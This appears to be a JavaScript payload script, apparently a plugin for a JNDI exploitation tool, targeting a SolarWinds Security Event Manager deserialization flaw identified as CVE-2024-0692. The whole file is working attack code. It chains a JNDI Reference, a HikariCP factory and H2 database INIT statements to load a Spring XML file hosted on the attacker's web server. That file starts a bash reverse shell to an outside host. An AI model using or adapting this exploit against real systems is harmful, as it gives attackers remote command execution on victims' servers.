var WebServer = Java.type("map.jndi.server.WebServer");
var Reference = Java.type("javax.naming.Reference");
var StringRefAddr = Java.type("javax.naming.StringRefAddr");

// SolarWinds Security Event Manager AMF Deserialization RCE (CVE-2024-0692)
// instantiate ClassPathXmlApplicationContext

var list = [];

// drop the previous alias if exists
list.push("DROP ALIAS IF EXISTS INVOKE_CONSTRUCTOR");
list.push("DROP ALIAS IF EXISTS INVOKE_METHOD");
list.push("DROP ALIAS IF EXISTS URI_CREATE");
list.push("DROP ALIAS IF EXISTS CLASS_FOR_NAME");

// alias some external Java methods
list.push("CREATE ALIAS INVOKE_CONSTRUCTOR FOR 'org.apache.commons.beanutils.ConstructorUtils.invokeConstructor(java.lang.Class, java.lang.Object)'");
list.push("CREATE ALIAS INVOKE_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeMethod(java.lang.Object, java.lang.String, java.lang.Object)'");
list.push("CREATE ALIAS URI_CREATE FOR 'java.net.URI.create(java.lang.String)'");
list.push("CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)'");

// Spring XML content
var content = '<?xml version="1.0" encoding="UTF-8" ?>\n' +
    '<beans xmlns="http://www.springframework.org/schema/beans"\n' +
    '   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n' +
    '   xsi:schemaLocation="\n' +
    ' http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">\n' +
    '    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">\n' +
    '        <constructor-arg>\n' +
    '        <list>\n' +
    '            <value>bash</value>\n' +
    '            <value>-c</value>\n' +
    '            <value><![CDATA[bash -i >& /dev/tcp/host/port 0>&1]]></value>\n' +
    '        </list>\n' +
    '        </constructor-arg>\n' +
    '    </bean>\n' +
    '</beans>\n';

// host the xml on a web server
var server = WebServer.getInstance();
server.serveFile("/exp.xml", content.getBytes());

var xml_url = "http://" + server.ip + ":" + server.port + "/exp.xml";

// invoke URI.create() to create a URI object
list.push("SET @uri=URI_CREATE('" + xml_url + "')");
// invoke uri.toString() to transform the type of `xml_url` (from java.lang.String to java.lang.Object) to avoid H2 SQL convert error
// because the return type of INVOKE_METHOD is java.lang.Object
list.push("SET @xml_url_obj=INVOKE_METHOD(@uri, 'toString', NULL)");
// instantiate ClassPathXmlApplicationContext
list.push("SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext')");
// the second parameter of INVOKE_CONSTRUCTOR requires java.lang.Object, so we use `xml_url_obj` instead of `xml_url`
list.push("CALL INVOKE_CONSTRUCTOR(@context_clazz, @xml_url_obj)");

// use INIT property to execute multi SQL statements, and each statement must be separated by `\;`
var url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=" + list.join("\\;") + "\\;";

var ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
ref.add(new StringRefAddr("jdbcUrl", url));

ref;